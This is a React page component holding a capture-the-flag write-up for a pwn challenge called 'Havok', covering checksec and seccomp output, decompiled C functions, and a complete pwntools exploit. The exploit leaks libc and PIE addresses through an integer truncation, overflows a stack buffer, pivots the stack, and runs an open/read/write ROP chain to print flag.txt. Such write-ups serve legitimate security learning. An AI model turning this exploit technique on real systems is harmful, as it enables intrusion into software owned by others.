import Content from "@/components/Content";

const menuItems = [
    {
        key: 'havok',
        type: ['rop', 'stackpivot'],
        id: 'havok',
        label: 'Havok',
        contents: `
# HAVOK

## Description
This challenge is about exploiting a integer overflow and a buffer overflow vulnerability
in C using IDA.

## Analysis

Firstly, I check the protection of the binary file. It came as no surprise that the binary is protected by Full RELRO, ASLR, NX, and PIE. It also bans execve, fork, and clone syscalls.
\`\`\` bash
Jaden@JadenPwner:/challenge$ pwn checksec ./havok

Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
Stripped:   No
Debuginfo:  Yes
\`\`\`

\`\`\` bash
Jaden@JadenPwner:/challenge$ seccomp-tools dump ./havok

 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x03 0x00 0x0000003b  if (A == execve) goto 0008
 0005: 0x15 0x02 0x00 0x00000142  if (A == execveat) goto 0008
 0006: 0x15 0x01 0x00 0x00000039  if (A == fork) goto 0008
 0007: 0x15 0x00 0x01 0x00000038  if (A != clone) goto 0009
 0008: 0x06 0x00 0x00 0x00000000  return KILL
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
\`\`\`

Secondly, I generate C pseudocode from the excutable files
\`\`\`c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
  puts("=====================================================");
  puts("   H A V O K ' S   C O S M I C   R I N G S");
  puts("=====================================================");
  puts("  Alex Summers channels the cosmic spectrum through");
  puts("  four concentric plasma rings.  Calibrate them.");
  puts("  Break them.  Claim what lies beyond.\n");
  setup_seccomp();
  puts("[*] Ring calibration pass 1 of 2:");
  calibrate_rings();
  puts("\n[*] Ring calibration pass 2 of 2:");
  calibrate_rings();
  read_plasma_signature();
  inject_plasma();
  puts(&unk_23F8);
  return 0;
}
\`\`\`

### Brainstorm
<details>
<summary>Function calibrate_rings()</summary>

- Work flow 
    - Read into idx_buf[32] from input --> no overflow
    - Convert idx_buf to int (bắt buộc >= 0)
        - If idx_buf <= 3 --> print last 2 bytes of idx_buf and ringdata[idx_buf]
    - Read into label[127] from input
        - If label contains '%' --> replace with '_'  

I definitely wants to get the address of both main and puts to get base LIBC and base PIE
so I need to read -1 and -2 to idx_buf to get the address of main and puts.

However, it prevents us to write a negative number to idx_buf so I need to find a way to 
overflow the idx_buf to get the address of main and puts. I only need the last two bytes so that I wrote 65535 and 65536 to idx_buf to get -1, -2
.


\`\`\`c
void __cdecl calibrate_rings()
{
  int i; // [rsp+8h] [rbp-E8h]
  int raw; // [rsp+Ch] [rbp-E4h]
  $7DC9876D9F8AD60A8EF220F7FC7BBB07 frame; // [rsp+10h] [rbp-E0h]
  char idx_buf[32]; // [rsp+40h] [rbp-B0h] BYREF
  char label[136]; // [rsp+60h] [rbp-90h] BYREF
  unsigned __int64 v5; // [rsp+E8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  frame.libc_anchor = (volatile __int64)&puts;
  frame.pie_anchor = (volatile __int64)main;
  frame.ring_data[0] = 0xC0FFEE0000000001LL;
  frame.ring_data[1] = 0xC0FFEE0000000002LL;
  frame.ring_data[2] = 0xC0FFEE0000000003LL;
  frame.ring_data[3] = 0xC0FFEE0000000004LL;
  puts("[RING 1] Cosmic Ring Calibration Interface");
  puts("         Probe a ring-energy slot (valid: 0 - 3):");
  memset(idx_buf, 0, sizeof(idx_buf));
  read(0, idx_buf, 31);
  idx_buf[strcspn(idx_buf, "\\n")] = 0;
  raw = atoi(idx_buf);
  if ( raw >= 0 )
  {
    if ( (__int16)raw > 3 )
      puts("[!] Index out of calibration range.");
    else
      printf("[*] Ring-%d energy: 0x%016llx\\n", (__int16)raw, frame.ring_data[(__int16)raw]);
    puts("    Provide a label for this ring reading:");
    memset(label, 0, 128);
    read(0, label, 127);
    label[strcspn(label, "\\n")] = 0;
    for ( i = 0; label[i]; ++i )
    {
      if ( label[i] == '%' )
        label[i] = '_';
    }
    printf("[LOG] %s\\n", label);
  }
  else
  {
    puts("[!] Negative indices are not permitted.");
  }
}
\`\`\`

</details>

<details>
<summary>Function read_plasma_signature()</summary>

.bss:
    plasma_sig

\`\`\`c
void __cdecl read_plasma_signature()
{
  puts("\\n[RING 3] Upload Plasma Signature (up to 256 bytes):");
  plasma_len = read(0, plasma_sig, 256);
  if ( plasma_len > 0 )
  {
    printf("[*] Signature received (%zd bytes). Buffered in cosmic memory.\\n", plasma_len);
  }
  else
  {
    puts("[!] No signature received.");
    plasma_len = 0;
  }
}
}
\`\`\`
</details>

<details>
<summary>Function inject_plasma()</summary>

We can easily see a buffer overflow bug here. We can overflow the confirm buffer
and overwrite \`rbp\` and \`rip\` to jump to the address of ROP chain

\`\`\` c
void __cdecl inject_plasma()
{
  char confirm[32]; // [rsp+0h] [rbp-20h] BYREF

  if ( plasma_len )
  {
    if ( validate_plasma() )
    {
      puts("\\n[RING 3] Initiating plasma injection sequence...");
      puts("         Confirm injection key:");
      read(0, confirm, 48);
      puts("[*] Injection acknowledged.");
    }
    else
    {
      puts("[!] Plasma resonance failure. Signature purged.");
    }
  }
  else
  {
    puts("[!] No plasma signature loaded. Aborting.");
  }
}
\`\`\`
</details>

## Exploitation
\`\`\`python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./havok_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
rop_exe = ROP

context.binary = exe

# Using tmux
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# context.terminal = 'wt.exe sp -d . wsl.exe -d Ubuntu-22.04'.split()
# Using windows terminal split, set "New Instance Behavior" to Attach to...

remote_connection = "nc addr 5000".split()
local_port = 1337

gdbscript = '''
'''
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sna = lambda msg, data: p.sendlineafter(msg, str(data).encode())
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sn = lambda data: p.sendline(str(data).encode())
s = lambda data: p.send(data)

def start():
    if args.REMOTE:
        libc = ELF("/lib/challenge/libc.so.6")
        return remote(remote_connection[1], int(remote_connection[2]))
    elif args.LOCAL:
        return remote("localhost", local_port)
    elif args.GDB:
        return gdb.debug([exe.path], gdbscript=gdbscript)
    else:
        return process([exe.path])

def GDB():
    if not args.LOCAL and not args.REMOTE:
        gdb.attach(p, gdbscript=gdbscript)
        pause()

p = start()

# your exploit here
leak_puts = b'65534' # Ep ve 2 byte = -2
leak_main = b'65535' # Ep ve 2 byte = -1

# recvuntil "Probe a ring-energy slot (valid: 0 - 3):"
s(leak_puts)
p.recvuntil(b'energy: ')
puts_addr = p.recvline().strip()
# input label
sl(b'a')

info(f"[RECEIVER] {p.recv()}")
s(leak_main)
p.recvuntil(b'energy: ')
main_addr = p.recvline().strip()
info(f"main_addr = {main_addr}")
# input label
sl(b'a')

OFFSET_MAIN = exe.symbols['main']
OFFSET_PUTS = libc.symbols['puts']
info(f"OFFSET_MAIN = {hex(OFFSET_MAIN)}")
info(f"OFFSET_PUTS = {hex(OFFSET_PUTS)}")

base_pie = int(main_addr, 16) - OFFSET_MAIN
base_libc = int(puts_addr, 16) - OFFSET_PUTS
info(f"base_pie = {hex(base_pie)}")
info(f"base_libc = {hex(base_libc)}")

# Address of excutable ROP gadgets
ROP_leave_ret = base_pie + 0x1224
ROP_poprsi_ret = base_libc + 0x53887
ROP_poprdx_xoreaxeax_ret = base_libc + 0xd6ffd
ROP_poprdi_ret = base_libc + 0x10269a
ROP_poprax_ret = base_libc + 0xd47d7
LIBC_syscall_ret_in___lll_lock_wake_private = base_libc + 0x93916

p.recv()

buffer_addr = int(main_addr, 16) + 10368
info(f"[BUFFER ADDR] = {hex(buffer_addr)}")

chain = p64(buffer_addr) # rsp's address value after second leave_ret

# open
# ropchain + gia tri muon lay
flag_str = b'flag.txt'
flag_addr = p64(buffer_addr + 224)
flag_buffer = p64(buffer_addr - 0x60)

chain += p64(ROP_poprdi_ret) + flag_addr
chain += p64(ROP_poprsi_ret) + p64(0)
chain += p64(ROP_poprdx_xoreaxeax_ret) + p64(0)
chain += p64(ROP_poprax_ret) + p64(2)
chain += p64(LIBC_syscall_ret_in___lll_lock_wake_private)

# read
chain += p64(ROP_poprdi_ret) + p64(3)
chain += p64(ROP_poprsi_ret) + flag_buffer
chain += p64(ROP_poprdx_xoreaxeax_ret) + p64(100)
chain += p64(ROP_poprax_ret) + p64(0)
chain += p64(LIBC_syscall_ret_in___lll_lock_wake_private)


# write
chain += p64(ROP_poprdi_ret) + p64(1)
chain += p64(ROP_poprsi_ret) + flag_buffer
chain += p64(ROP_poprdx_xoreaxeax_ret) + p64(100)
chain += p64(ROP_poprax_ret) + p64(1)
chain += p64(LIBC_syscall_ret_in___lll_lock_wake_private)

chain += flag_str + b'\\x00'

sl(chain)

p.recvuntil(b'injection key:')

fake_rbp = buffer_addr # Change the stack frame

overwrite_payload = b'a' * 32 + p64(fake_rbp) + p64(ROP_leave_ret)


sl(overwrite_payload)

p.interactive()
\`\`\`
        `
    }
]

const ApoorvCtf = () => {
    return (
        <div className="max-w-2xl flex flex-col gap-4 markdown-content">
            <Content menuItems={menuItems} />
        </div>
    );
};

export default ApoorvCtf;